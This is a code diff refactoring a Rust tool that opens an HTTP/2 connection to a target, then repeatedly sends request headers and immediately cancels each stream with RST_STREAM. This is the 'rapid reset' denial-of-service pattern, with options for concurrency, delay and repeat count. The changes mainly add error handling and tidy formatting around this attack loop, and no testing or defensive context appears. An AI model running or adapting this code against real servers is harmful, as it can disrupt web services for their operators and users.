@@ -47,14 +47,21 @@ struct Opt {
 
 #[tokio::main]
 async fn main() {
-    tracing_subscriber::fmt::init();
+    // Initialize logging
+    if let Err(e) = tracing_subscriber::fmt::try_init() {
+        eprintln!("Failed to initialize logger: {:?}", e);
+    }
 
     let opt = Opt::from_args();
 
+    // Reinitialize the logger with a debug level if verbose is enabled
     if opt.verbose {
-        tracing_subscriber::fmt().with_max_level(tracing::Level::DEBUG).init();
+        tracing_subscriber::fmt()
+            .with_max_level(tracing::Level::DEBUG)
+            .init();
     }
 
+    // Parse the provided URL
     let uri = match opt.url.parse::<Uri>() {
         Ok(uri) => uri,
         Err(e) => {
@@ -63,30 +70,54 @@ async fn main() {
         }
     };
 
-    let authority = uri.authority().expect("URI should have authority");
+    let authority = match uri.authority() {
+        Some(authority) => authority,
+        None => {
+            error!("URI does not have authority");
+            return;
+        }
+    };
     let domain = authority.host();
 
     // Configure TLS
     let mut root_cert_store = RootCertStore::empty();
-    root_cert_store.add_server_trust_anchors(
-        webpki_roots::TLS_SERVER_ROOTS
-            .iter()
-            .map(|ta| tokio_rustls::rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(ta.subject, ta.spki, ta.name_constraints)),
-    );
+    root_cert_store.add_server_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
+        tokio_rustls::rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
+            ta.subject,
+            ta.spki,
+            ta.name_constraints,
+        )
+    }));
 
-    let mut config = ClientConfig::builder()
+    let config = ClientConfig::builder()
         .with_safe_defaults()
         .with_protocol_versions(&[ProtocolVersion::TLSv1_2, ProtocolVersion::TLSv1_3])
         .with_root_certificates(root_cert_store)
         .with_no_client_auth();
 
-    config.enable_early_data = true; // Enable TLS 1.3 early data if supported by the server
-
     let connector = TlsConnector::from(Arc::new(config));
-    let tcp = TcpStream::connect((authority.host(), 443)).await.expect("Failed to connect to server");
-    let tls = connector.connect(domain.try_into().unwrap(), tcp).await.expect("Failed to perform TLS handshake");
+    let tcp = match TcpStream::connect((authority.host(), 443)).await {
+        Ok(stream) => stream,
+        Err(e) => {
+            error!("Failed to connect to server: {}", e);
+            return;
+        }
+    };
+    let tls = match connector.connect(domain.try_into().unwrap(), tcp).await {
+        Ok(stream) => stream,
+        Err(e) => {
+            error!("Failed to perform TLS handshake: {}", e);
+            return;
+        }
+    };
 
-    let (mut client, connection) = client::handshake(tls).await.expect("Failed to perform HTTP/2 handshake");
+    let (mut client, connection) = match client::handshake(tls).await {
+        Ok((client, connection)) => (client, connection),
+        Err(e) => {
+            error!("Failed to perform HTTP/2 handshake: {}", e);
+            return;
+        }
+    };
 
     tokio::spawn(async move {
         if let Err(e) = connection.await {
@@ -96,12 +127,11 @@ async fn main() {
 
     let semaphore = Arc::new(Semaphore::new(opt.concurrency));
     let stream_counter = Arc::new(AtomicU32::new(1));
-
     let path = uri.path_and_query().map(|pq| pq.as_str()).unwrap_or("/");
 
     for _ in 0..opt.retries {
-        let semaphore = semaphore.clone();
-        let stream_counter = stream_counter.clone();
+        let semaphore = Arc::clone(&semaphore);
+        let stream_counter = Arc::clone(&stream_counter);
         let headers = opt.headers.clone();
         let path = path.to_string();
 
@@ -125,11 +155,9 @@ async fn main() {
 
             debug!("[{}] Sent HEADERS on stream {}", stream_id, stream_id);
 
-            // Wait for the specified delay before sending RST_STREAM
             tokio::time::sleep(Duration::from_millis(opt.delay)).await;
 
             send_stream.send_reset(h2::Reason::CANCEL);
-
             debug!("[{}] Sent RST_STREAM on stream {}", stream_id, stream_id);
 
             match response.await {
@@ -155,6 +183,8 @@ async fn main() {
 
             drop(permit);
             tokio::time::sleep(Duration::from_millis(opt.delay)).await;
-        }).await.unwrap();
+        })
+        .await
+        .unwrap();
     }
 }
